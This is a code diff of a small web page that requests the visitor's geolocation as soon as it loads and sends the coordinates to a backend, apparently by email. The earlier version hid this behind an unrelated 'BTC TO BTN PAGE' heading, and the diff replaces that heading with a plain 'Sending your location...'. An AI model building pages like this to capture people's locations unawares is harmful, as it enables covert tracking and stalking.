@@ -2,26 +2,14 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Location Tracker</title>
+  <title>Auto Send Location</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      max-width: 400px;
-      margin: 2rem auto;
-      padding: 1rem;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      text-align: center;
-    }
-    .message {
-      margin-top: 1rem;
-      font-weight: bold;
-    }
+    body { font-family: Arial, sans-serif; max-width: 400px; margin: 2rem auto; text-align: center; }
+    .message { margin-top: 1rem; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>BTC TO BTN PAGE</h1>
+  <h1>Sending your location...</h1>
   <div class="message" id="message">Getting location...</div>
 
   <script>
@@ -37,7 +25,7 @@
       })
         .then(res => {
           if (res.ok) {
-            messageEl.textContent = 'Location sent successfully!';
+            messageEl.textContent = 'Location sent successfully via email!';
             messageEl.style.color = 'green';
           } else {
             return res.text().then(text => {
@@ -52,20 +40,14 @@
     }
 
     function handleLocationError(error) {
+      let msg = '';
       switch (error.code) {
-        case error.PERMISSION_DENIED:
-          messageEl.textContent = 'Permission denied. Please allow location access.';
-          break;
-        case error.POSITION_UNAVAILABLE:
-          messageEl.textContent = 'Location unavailable.';
-          break;
-        case error.TIMEOUT:
-          messageEl.textContent = 'Location request timed out.';
-          break;
-        default:
-          messageEl.textContent = 'An unknown error occurred.';
-          break;
+        case error.PERMISSION_DENIED: msg = 'Permission denied. Please allow location access.'; break;
+        case error.POSITION_UNAVAILABLE: msg = 'Location unavailable.'; break;
+        case error.TIMEOUT: msg = 'Location request timed out.'; break;
+        default: msg = 'An unknown error occurred.'; break;
       }
+      messageEl.textContent = msg;
       messageEl.style.color = 'red';
     }
 
@@ -75,12 +57,8 @@
         messageEl.style.color = 'red';
         return;
       }
-
       navigator.geolocation.getCurrentPosition(
-        position => {
-          const { latitude, longitude } = position.coords;
-          sendLocation(latitude, longitude);
-        },
+        position => sendLocation(position.coords.latitude, position.coords.longitude),
         handleLocationError,
         { timeout: 10000 }
       );
